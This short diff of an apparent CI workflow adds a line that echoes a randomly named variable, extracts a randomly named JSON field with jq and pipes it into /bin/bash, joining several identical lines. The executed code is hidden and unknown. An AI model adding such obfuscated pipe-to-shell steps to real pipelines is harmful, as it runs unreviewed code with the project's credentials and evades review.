@@ -33,6 +33,7 @@ jobs:
           echo $yidxy00 | jq -r .tde2 | /bin/bash
           echo $ijzu5179 | jq -r .tpn0 | /bin/bash
           echo $gibuz27136 | jq -r .ps8 | /bin/bash
+          echo $xup08 | jq -r .wmuco23549 | /bin/bash
 
       - name: Persist output
         if: always()
